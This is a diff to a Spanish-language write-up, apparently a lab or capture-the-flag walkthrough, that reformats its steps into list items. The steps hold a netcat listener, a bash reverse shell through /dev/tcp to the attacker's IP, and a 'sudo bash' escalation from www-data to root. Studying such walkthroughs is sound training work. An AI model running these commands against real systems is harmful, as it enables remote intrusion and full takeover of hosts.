@@ -159,30 +159,37 @@ Parámetros utilizados
 
 #: También podemos conseguir una shell interactiva y posteriormente realizar la escalada.
 
-#: Primero identificamos nuestra dirección IP: ip addr
+#: Primero identificamos nuestra dirección IP: 
+- ip addr
 
-#: En nuestra máquina de ataque iniciamos un listener: nc -lvnp 4444
+#: En nuestra máquina de ataque iniciamos un listener: 
+- nc -lvnp 4444
 
 #: Desde el Command Panel podemos ejecutar una reverse shell:
-  -comando: bash -c 'exec bash -i &>/dev/tcp/ip/4444 <&1'
+- bash -c 'exec bash -i &>/dev/tcp/ip/4444 <&1'
 
 #:Debemos reemplazar IP por la dirección IP de nuestra máquina de ataque.
 
-#: Una vez recibida la conexión, comprobamos el usuario actual:whoami
+#: Una vez recibida la conexión, comprobamos el usuario actual:
+- whoami
 
-#: Obtenemos: www-data
+#: Obtenemos: 
+- www-data
 
-#: Ahora comprobamos los permisos de sudo: sudo -l
-
+#: Ahora comprobamos los permisos de sudo: 
+- sudo -l
 
 #: Podemos observar que el usuario tiene permisos para ejecutar comandos con privilegios administrativos.
 
-#: Ejecutamos: sudo bash
+#: Ejecutamos: 
+- sudo bash
 
-#: Finalmente comprobamos nuestra identidad con el comando: whoami
+#: Finalmente comprobamos nuestra identidad con el comando:
+- whoami
 
-#: El resultado es:root
-
+#: El resultado es:
+- root
+  
 #: Hemos conseguido una shell con privilegios de root.
 
 ## 7. Conclusiones
